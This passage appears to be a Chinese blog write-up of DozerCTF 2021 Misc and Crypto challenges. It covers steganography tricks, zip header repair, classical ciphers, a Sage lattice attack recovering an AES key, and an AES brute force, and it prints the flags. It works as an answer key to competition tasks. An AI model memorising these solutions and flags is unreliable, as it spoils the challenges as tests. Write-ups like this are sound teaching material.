    <content type="html"><![CDATA[<p>​    </p><blockquote><p>比赛时间：2021年5月29日 9:00-2021年5月30日晚21:30<br>比赛平台：<a href="http://1.14.160.21:8000/">http://1.14.160.21:8000/</a></p></blockquote><p>Web几乎全是域渗透，Crypto几乎全是AES。</p><p>Rank: 12</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="不会有人以为re那道才是签到吧"><a href="#不会有人以为re那道才是签到吧" class="headerlink" title="不会有人以为re那道才是签到吧"></a>不会有人以为re那道才是签到吧</h3><blockquote><p>欢迎参加DozerCTF 2021 <a href="https://www.bilibili.com/video/BV1VK4y1G7HQ">https://www.bilibili.com/video/BV1VK4y1G7HQ</a></p></blockquote><p>视频中后段有闪过的flag，拼手速暂停大法。</p><p>​    </p><h3 id="detective-novel"><a href="#detective-novel" class="headerlink" title="detective_novel"></a>detective_novel</h3><blockquote><p>听说扫一扫就有flag</p></blockquote><p>flag.png 分离出 zip压缩包，在 novel 目录下有两个文件 flag.jpg 和 hint.png。</p><p>hint.png 分离出另一个 zip压缩包，检查发现头部错误且包含伪加密，修复头部 <code>504B03040A000900</code> 为 <code>504B030414000000</code> ，在 easy_riddle 目录下有两个文件 hint.txt 和 letter.png。</p><p>letter.png 福尔摩斯使用过的跳舞小人密码，解出 <code>DOZER</code>，再结合之前 hint.png 内文字 <code>guess what can you get !!!</code>，用 outguess 从 flag.jpg 提取文件得flag：</p><p><code>outguess -r flag.jpg -k DOZER -t out.txt</code></p><p>​    </p><h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><blockquote><p>看不到看不到</p></blockquote><p>xiaojiejie.jpg 分离出一张gif图片和一张png图片。</p><p>gif图片分帧分别扫二维码拼接得前半段 <code>Dozer&#123;is_it_simple</code>，png二维码图片扫码发现文字中间有不可见字符，猜测为零宽隐写，使用 <a href="http://330k.github.io/misc_tools/unicode_steganography.js">unicode_steganography</a> 提取字符：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = unicodeSteganographer</span><br><span class="line">s.setUseChars(<span class="string">&#x27;\u200b\u200c\u200d\u200e\u200f&#x27;</span>);</span><br><span class="line">s.decodeText(<span class="string">&quot;我已经看见了，​​​​‎‏​​​​​‏​‍​​​​‏‍‌​​​​‏‍‏​​​​‎‏​​​​​‏‏‌​​​​‏‍‌​​​​‏‎‍​​​​‌‌‎​​​​‎‏‏​​​​‏‍‌​​​​‏‍​​​​​‏​‎​​​​‏‍‏​​​​‎‏‍​​​​‏‎‌​​​​‏‎‍​​​​‏‌‎​​​​‎‏‍​​​​‏‎‌​​​​‏​‌​​​‌​​​你呢？&quot;</span>)</span><br></pre></td></tr></table></figure><p>解出后半段 <code>_for_you!congratulate&#125;</code></p><p>​    </p><h3 id="funny-pixel"><a href="#funny-pixel" class="headerlink" title="funny_pixel"></a>funny_pixel</h3><blockquote><p>听说国赛有一个running_pixel?</p></blockquote><p>按提示参考ciscn题，提取218张图片里的0/1，可按照0/1图案颜色（RGB: EFEF27）计算像素数来识别：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">219</span>):</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">framepic = Image.<span class="built_in">open</span>(<span class="string">f&quot;./funny_pixel/<span class="subst">&#123;name&#125;</span>.png&quot;</span>)</span><br><span class="line">framepic = framepic.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">width,height = framepic.size</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line"><span class="keyword">if</span> framepic.getpixel((w,h)) == (<span class="number">0xef</span>,<span class="number">0xef</span>,<span class="number">0x27</span>):</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>((name,count))</span><br><span class="line"><span class="keyword">if</span> count != <span class="number">10</span> <span class="keyword">and</span> count != <span class="number">5</span>:</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">flag += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> count == <span class="number">10</span> <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#01000100011011110111101001100101011100100100001101010100010001100111101101000100001100000101111101111001010011110101010101011111010011000100100101101011011001010101111101010000011010010111100001000101011011000111110111</span></span><br></pre></td></tr></table></figure><p>观察得到的0/1字符串，<code>1000100 = D</code>，<code>1101111 = o</code>，类推知每个字符7位二进制中间用0分隔，提取转回字符即为flag：<code>DozerCTF&#123;D0_yOU_LIke_PixEl&#125;</code>。</p><p>​    </p><h3 id="一点也不杂"><a href="#一点也不杂" class="headerlink" title="一点也不杂"></a>一点也不杂</h3><blockquote><p>出题人说，这个题目一点也不杂</p></blockquote><p>三个文件，flag分三部分。</p><p>第一部分，5月日历+图片尾部13组数字，在日历上连线出猪圈密码图案，对照解出 <code>DOYOUKNOW_CRT</code>。</p><p>第二部分，简单中国剩余定理(CRT)应用，Sage运行<code>crt([2,2,9,16],[5,7,17,23])</code>，得key=5007。</p><p>第三部分，直接base85解码得 <code>_good_over&#125;</code></p><p>加头 <code>DozerCTF&#123;</code> 拼接为flag。</p><p>​    </p><h3 id="做个问卷吧"><a href="#做个问卷吧" class="headerlink" title="做个问卷吧"></a>做个问卷吧</h3><blockquote><p>赛题基本上线完毕，感谢参加DozerCTF 2021! 问卷：<a href="https://tp.wjx.top/vj/t2bF3sc.aspx">https://tp.wjx.top/vj/t2bF3sc.aspx</a></p></blockquote><p>反馈+吐槽。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Horcrux"><a href="#Horcrux" class="headerlink" title="Horcrux"></a>Horcrux</h3><blockquote><p>Harry Potter &amp;&amp; Aquila</p></blockquote><p>AeroCTF 2021原题，构造结式解椭圆曲线方程组+LLL算法+恢复参数值，参考：</p><p><a href="https://gist.github.com/hellman/a8c9a09b1ce6959226f9d75cf94b805f">AeroCTF 2021 - Horcrux</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">proof.arithmetic(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x95a599ab706381e861caf2c6e757204c704b77a38592ae0db282000d8537ab0e4608ecd9a524ad6e14eb9564353b5c1036ff13c8503bfad7e8695d0bcf15df766c1be64aa4e73b75e0ecb28ea9e74eafc613d2fb9299fac060826bd071a92d2bd5be44d6d65e6b63146d617e800b79e25358b4a3e22a62457f2d39c21a694f54c03ad5d69a674fa6cd91c2971524152c1b6d177c455e0f255ce4fa18253da252613959c17b49ac422a9009933d0c59210646fca85e8ae35d5df34d6afde9d951909585c3f3e53e06ef5ae319fa035e57941599c2a73133bba490b66ab38e7537fd3ed322bf3a0431f02f276b5b18b623865883e3f0b67a511293b5a7576c97e6663cb1c32bdff5cda825549742d067e1b4ca847c75ef6b601feced3a9bb4dea41f1e5c40a8f2af2983f010d7bbc9ba992cedcdac6922a056d52873af110ae578da5e875fa6a121cdb45fe5e8198c121f7e9609d100d023a9155d6aa9efe28aa9036079564780db663aad36796ee8349b98b11d1b108125</span></span><br><span class="line">F = GF(p)</span><br><span class="line"></span><br><span class="line">x0 = F(<span class="number">0x93436a2bdfecc923d69385f164ef891ef5b08418e5b4e65c980e0b054e86ee8b8e24a527dad9fe3883234179167ada4b5f413c07c548f3dc224db1f2791c8a44bb857c722676d621fa07ad4beee4dc2be679c351cc19423aaff444e5c908b767d9ebec006bf0f020b8c0d15775fc84524333c47d4bc46ae8bd3cb18e1b037e59a388e39a81c1d97c9654742979ed54741df9aba6954c2801efb63d91ed1a51889ee1e8848b7bf111c987cb558e08b9caa17e50f578fa0af70bf855393dcc6c52420897eae663700818dbec237e094c1d4904a249d92702ab4046e52694db73a5fb83953262dff0251fa5fd1b4a99fb70addcde2a38d8766e02360b7b29aad1382ecdd63650f2b597469267dccc11ee7d0b10178c68a02b2d03db5bfcd6d663c11bc2ef855e30528aec48a9f4f53f71c52ac6e0c92fcaf0f8576982b1135bbb15fb5035c7853de51b8aa5b858646dd23b7b01d837c6b3c38f4bdcef6009ee02456bbdcbe8978eb400326c4fd0a899ed9f559ba963b25317</span>)</span><br><span class="line">y0 = F(<span class="number">0x47b8c9d33929bfe12657a2f482213cca803fe37e8485ebde814dc91ce56ed480cea04f24176edce77ebfd7d9bba3a864cfe6176ef1d68ebc184dcde0667704adc472d1d16688affa657cff460edf05f92dad743ca3421150ec7ef98e08a9d17af033a555ed49f0e9c7457bf339a9270e8b44b7b75dd43afd27614d0ce59878c019d902d9ed23a26f04a431130534f85b05db586fd9a65a178204eb7d568a0e64dd16a369d2af6f2b8cd32a9e9be8322885c78a30dc8019ca3c48f39bad38de4ab60970ee1c44688d2afa901f46af7d2e7ced0e34204d6b38330fd87d6bf5bb61378e092780a48b985654de1c65b0a6146a82f84bfe09359820942980ce5c607bfc14497a79436bc4f351ae697875d93049c30dafc698208a17f9b785aa35448e4ef341102053c62a9923287f4cf597ff492fd0eac4ef77ae879a22c6c8a3a53baef09f574316fd872e1a6dd1ad9eb72a3e39f925e25fe06f7983b785dcb110bd127c8e2736e7345fd7ffce687c66c492a541e00c500574</span>)</span><br><span class="line">x1 = F(<span class="number">0x37a181d88a683e2eeba3147bfb3043be6067fc722b8578255e25a335fadda9ead31c41d7742dbf3df7e4c3effc9297ef528730b3d8920978e342e123b9f19ab15a5ed2c19c45aaee728e53acd8c44e7543c4b9bcd40f27b8efac1a1e431ddbab15b4341c6cc817516634c2ab1117e784e429b9f797963b18442127342455d469ca9d9ff24b241afe9b7fdd4b91bb9750710e6f00b9fe631c1db71c308ef4642251fc00d0433910161d588c100944d55935ddf7dc656cc1670065c5bc6607358304c228f8495cca579a3a78102b4e617687f3aad0c5826e3aa7a85c85c99af2254002d3578c0af342ea1f49b9a425eba90e2473470fec77a945b45cf67dde9cb4e0ef445b974164cbcb61ec7cbcd77c94d42c6dce15ae500e4b6b15d38923ba2773176ae1e3354baaae47b422ec0ff8273538ad0a6a03a33d60a52257698130f6db6baaa4d338e167443eb4ac1b57b0d6f424e9d0b2f6b6b0df609b81150928286443afe7d1b9bbb30389af0db1597945d233cd19121d11</span>)</span><br><span class="line">y1 = F(<span class="number">0x7696ea73e7345896be516aac44aa8ba35242babc3853a2a3fbf7081a3f5a845dba81f01d7aba946f7a9886eb1918d367baa87f387e86e095bb88bbc44f58768e8c2db3a1926301c984ea19f8e680fb7f4f7108c4c8565fc7cb66284bdf81e547e446faa80e88a59ceae3bb43b2c6ac1f8858e5f126fcc224f62aef611184d714db86a5c19060e0a9844def0e047d3a46e9d64f42c0cef9f85812068d580f9722b1520c2847b34c6ed7afc89b633113606aa397c10f1ea653e4d15fb160f2c1d4750a6c4eaef7e6fa56c35d393fe7d3ef91fc9ea56a69fd9614e8c39da6dc0981c6004468db1d81a13ebaf3bfd9e640c39b63b107605ba28a5c18b4a03ca627102ff63ddc8483dce2c06e97f614a4d93f9d615f849a6ce0c164217dabe849ceaf1ade997700daf9aca95f7811cc615cf61887e199ddf963a780829cc186b96d96f2b3c1f001eaa0e289b7fc79e5c24ce2aad55f9adb9ecaacba5445773222aee3cf997c171f7bcbcba65caa6c254186a1fa1982521d8ab1</span>)</span><br><span class="line">x2 = F(<span class="number">0x3117ba57d46bd2da19fed7e3f087ec252b45340c1a338a5096a94538be0f9776388ec70cc22c475968a352f2a34f1637b660aea2f5a741d925d550b9bc91f3b5da0e9b6585aee5413d89f6734651439f7c6905c2b98b7e4aef425a50852b626ad7bd2a4f67909acc0d6ac7e33688f3cf676ac3c00a32e12eecb384cd9b099244c2ef37f054a271a2c174f3eac5553415b097ee84b590258df022d1142b28be0ca756784bfae2e42a1bf98a3c48ea9baa2466172673b978d1372a2ac5e20ff869dacbbfe0f56d4d4de947d39a5bb643cd3b00c1e6d4b82e090105358fc105f75ee1dec962696ef406474d5934ed27e375952012bf797ebd8fff2d4b08935086850fc89039b3c4c0ab712a9859c6e43dad3fae4c5048d60a5069c338a63ac49f3a7fa99614bd8a17a9522c82333ecaf88c41b0b8be60ebee5b52df4d853ef397786a113b5064e236299e795dbec72baf001c6dd973e424e86e79368d6b10f3b43a47eb8fae6e48c2b42aa7e2566879f9b675e4837a59366b</span>)</span><br><span class="line">y2 = F(<span class="number">0x1e6d85c241d60abc738c606cc4237a617f7a341934d59cd0a3becbb1f4acdc740673a84df7646d1afd08d0d132d8188a35eca0ca8bee5208b73b141de1c4a4a254c6f6278f6860d8d40d9eb301281373dadb1e9bfbeeaa4b0b1ef48b787b47a490cce2f2c64d03a61036ebe565fe4f93dec2e030ecf1a91d1c65b82dfca045b07c526a87293d4844d92327669ca19a2a2e62d4e6e9d46d24d0994434e52f2ea1e9492d46039959afa75365d88e90ab13097f075c4a93d102514cac901ca760155152788e5d352c09e012f6d87fb262d3db9174014c2d9c88e289c902700dc202b05c0600b3f96be0ffc10ae58738718fee7c21e387ddf390a9a1e26a6cb2b744971b67621c1211f0127969a969318beb60a361b924db7707b4170ed3af22dc412d15eb71c553dc79dbebc238dc2baecea806351288b05db9f6885cc53af7509aa3c810540e648ff5e94ba75bf0dbf097d515babe0f99dcd4ddcc10f7a6549a3f12148ca51e4f4f5ab16bf0cb5c069b2cd87c1738bce308</span>)</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">R = PolynomialRing(F, names=<span class="string">&#x27;aa1, aa2, bb1, bb2, a, b&#x27;</span>)</span><br><span class="line">aa1, aa2, bb1, bb2, a, b = R.gens()</span><br><span class="line">bounds = <span class="built_in">dict</span>(aa1=<span class="number">2</span>**BITS, aa2=<span class="number">2</span>**BITS, bb1=<span class="number">2</span>**BITS, bb2=<span class="number">2</span>**BITS)</span><br><span class="line"></span><br><span class="line">eq0 = x0**<span class="number">3</span> + a*x0 + b - y0**<span class="number">2</span></span><br><span class="line">eq1 = (x1 + aa1)**<span class="number">3</span> + a*(x1 + aa1) + b - (y1 + bb1)**<span class="number">2</span></span><br><span class="line">eq2 = (x2 + aa2)**<span class="number">3</span> + a*(x2 + aa2) + b - (y2 + bb2)**<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resultant</span>(<span class="params">p1, p2, var</span>):</span></span><br><span class="line">    p1 = p1.change_ring(QQ)</span><br><span class="line">    p2 = p2.change_ring(QQ)</span><br><span class="line">    var = var.change_ring(QQ)</span><br><span class="line">    r = p1.resultant(p2, var)</span><br><span class="line">    <span class="keyword">return</span> r.change_ring(F)</span><br><span class="line"></span><br><span class="line">poly = eq0</span><br><span class="line">poly1 = resultant(poly, eq1, b)</span><br><span class="line">poly2 = resultant(poly, eq2, b)</span><br><span class="line">poly = resultant(poly1, poly2, a)</span><br><span class="line">poly /= poly.coefficients()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(poly.monomials())</span><br><span class="line"></span><br><span class="line">bits = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> mono <span class="keyword">in</span> poly.monomials():</span><br><span class="line">    mono_bits = RR(log(mono.change_ring(ZZ).subs(**bounds), <span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(mono, <span class="string">&quot;%.2f&quot;</span> % mono_bits )</span><br><span class="line">    bits += mono_bits</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(poly.monomials())</span><br><span class="line">m = matrix(ZZ, n, n)</span><br><span class="line">m[<span class="number">0</span>] = vector(poly.coefficients())</span><br><span class="line">m[<span class="number">1</span>:,<span class="number">1</span>:] = p * identity_matrix(n-<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prmat</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(*[&#123;<span class="number">0</span>: <span class="string">&quot;0&quot;</span>, <span class="number">1</span>: <span class="string">&quot;1&quot;</span>, p: <span class="string">&quot;p&quot;</span>&#125;.get(v, <span class="string">&quot;x&quot;</span>) <span class="keyword">for</span> v <span class="keyword">in</span> row])</span><br><span class="line">prmat(m)</span><br><span class="line"></span><br><span class="line">monos = vector(poly.change_ring(ZZ).monomials())</span><br><span class="line">factors = [mono(**bounds) <span class="keyword">for</span> mono <span class="keyword">in</span> monos]</span><br><span class="line"></span><br><span class="line">[m.rescale_col(i, factor) <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors)]</span><br><span class="line">m = m.LLL()</span><br><span class="line">m = m.change_ring(QQ)</span><br><span class="line">[m.rescale_col(i, QQ(<span class="number">1</span>)/factor) <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors)]</span><br><span class="line">m = m.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">polys = []</span><br><span class="line"><span class="keyword">for</span> pol <span class="keyword">in</span> m*monos:</span><br><span class="line">    maxval = <span class="built_in">sum</span>(</span><br><span class="line">        (<span class="built_in">abs</span>(<span class="built_in">int</span>(coef)) * mono).change_ring(ZZ).subs(**bounds)</span><br><span class="line">        <span class="keyword">for</span> coef, mono <span class="keyword">in</span> pol</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;polynomial with max value&quot;</span>, RR(log(maxval, <span class="number">2</span>)), <span class="string">&quot;bits&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> maxval &lt; p:</span><br><span class="line">        polys.append(pol)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;got&quot;</span>, <span class="built_in">len</span>(polys), <span class="string">&quot;polynomials&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">hs, <span class="built_in">vars</span>, solbits, padbits=<span class="number">20</span></span>):</span>    </span><br><span class="line">    nbits = solbits + padbits</span><br><span class="line">    <span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line">    sols = &#123;(<span class="number">0</span>,) * <span class="built_in">len</span>(<span class="built_in">vars</span>)&#125;</span><br><span class="line">    polys = [h.change_ring(Zmod(<span class="number">2</span>**nbits)) <span class="keyword">for</span> h <span class="keyword">in</span> hs]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bit&quot;</span>, i, <span class="string">&quot;/&quot;</span>, nbits, <span class="string">&quot;:&quot;</span>, <span class="built_in">len</span>(sols), <span class="string">&quot;candidates&quot;</span>)</span><br><span class="line">        sols2 = <span class="built_in">set</span>()</span><br><span class="line">        mod = <span class="number">2</span>**i</span><br><span class="line">        polys = [h.change_ring(Zmod(<span class="number">2</span>*mod)) <span class="keyword">for</span> h <span class="keyword">in</span> hs]</span><br><span class="line">        <span class="keyword">for</span> bits <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>), repeat=<span class="built_in">len</span>(<span class="built_in">vars</span>)):</span><br><span class="line">            <span class="keyword">for</span> sol <span class="keyword">in</span> sols:</span><br><span class="line">                sol2 = <span class="built_in">tuple</span>(ss + bit*mod <span class="keyword">for</span> ss, bit <span class="keyword">in</span> <span class="built_in">zip</span>(sol, bits))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">any</span>(poly(*sol2) <span class="keyword">for</span> poly <span class="keyword">in</span> polys):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                sols2.add(sol2)</span><br><span class="line">        sols = sols2</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sols:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;fail&quot;</span>, i)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sols?&quot;</span>, i, <span class="built_in">len</span>(sols))</span><br><span class="line">    <span class="comment"># TBD: automate adding pad bits to determine right sols by smallness</span></span><br><span class="line">    <span class="keyword">for</span> sol <span class="keyword">in</span> sols:</span><br><span class="line">        <span class="comment"># fix signs</span></span><br><span class="line">        sol = [v <span class="keyword">if</span> v &lt; <span class="number">2</span>**(nbits-<span class="number">1</span>) <span class="keyword">else</span> (v-<span class="number">2</span>**nbits) <span class="keyword">for</span> v <span class="keyword">in</span> sol]</span><br><span class="line">        <span class="comment"># too large solution</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(<span class="built_in">abs</span>(v) &gt;= <span class="number">2</span>**solbits <span class="keyword">for</span> v <span class="keyword">in</span> sol):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># wrong solution</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(poly(*sol) <span class="keyword">for</span> poly <span class="keyword">in</span> hs):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">yield</span> sol</span><br><span class="line">        </span><br><span class="line">R = PolynomialRing(ZZ, names=<span class="string">&#x27;aa1, aa2, bb1, bb2&#x27;</span>)</span><br><span class="line">polys = [R(pol) <span class="keyword">for</span> pol <span class="keyword">in</span> polys]</span><br><span class="line">sols = <span class="built_in">list</span>(recover(polys[:<span class="number">4</span>], R.gens(), BITS))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;1df819824bb4299817560c5ee69bd8eaabaf3c47e33a57e39eb1ccddec66d9fb38c6df8ebf35b368ebeecd803d66afb2&quot;</span>)</span><br><span class="line">sol_aa1, sol_aa2, sol_bb1, sol_bb2 = sols[<span class="number">0</span>]</span><br><span class="line">parts = [</span><br><span class="line">    (<span class="built_in">int</span>(x1)+<span class="built_in">int</span>(sol_aa1))^^<span class="built_in">int</span>(x1),</span><br><span class="line">    (<span class="built_in">int</span>(y1)+<span class="built_in">int</span>(sol_bb1))^^<span class="built_in">int</span>(y1),</span><br><span class="line">    (<span class="built_in">int</span>(x2)+<span class="built_in">int</span>(sol_aa2))^^<span class="built_in">int</span>(x2),</span><br><span class="line">    (<span class="built_in">int</span>(y2)+<span class="built_in">int</span>(sol_bb2))^^<span class="built_in">int</span>(y2),</span><br><span class="line">]</span><br><span class="line">key = pack(<span class="string">&quot;&gt;4I&quot;</span>, *parts)</span><br><span class="line"><span class="built_in">print</span>(AES.new(key, mode=AES.MODE_ECB).decrypt(ct).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#DozerCTF&#123;B3y0ND_ThE_4QUIL4_2IFT&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="手滑的袁学长"><a href="#手滑的袁学长" class="headerlink" title="手滑的袁学长"></a>手滑的袁学长</h3><blockquote><p>袁学长出题的时候不小心把密文给删掉几位，现在用$替换了一下，凑活看吧</p></blockquote><p>代码逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">plain:</span><br><span class="line">I do not care th</span><br><span class="line">e result2?9cf037</span><br><span class="line">f8b3a?2b19b5bda9</span><br><span class="line">78c294?5\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line"></span><br><span class="line">key:</span><br><span class="line">2?9cf037f8b3a?2b19b5bda978c294?5</span><br><span class="line"></span><br><span class="line">encrypt:</span><br><span class="line">91e5fb43f053b21ce12e41df0b0ae0bb</span><br><span class="line">6a20c55719151$$fccecb4$$$$$2a27c</span><br><span class="line">8c582c6704f$$$$153bd3313b84235ac</span><br><span class="line">e16a7b3b190$e487abfa9$cf379d1a3c</span><br><span class="line"></span><br><span class="line">algorithm:</span><br><span class="line">c1 = AES(key, p1^f2),  e1=c1^f1</span><br><span class="line">c2 = AES(key, p2^c1),  e2=c2^p1</span><br><span class="line">c3 = AES(key, p3^c2),  e3=c3^p2</span><br><span class="line">c4 = AES(key, p4^c3),  e4=c4^p3</span><br><span class="line">flag = f1+f2</span><br></pre></td></tr></table></figure><p>从 <code>key</code> 和 <code>e4</code> 入手爆破，未知位数3+2=5层循环（16^5=1048576），根据已知条件，枚举求出flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_hex</span>(<span class="params">s, 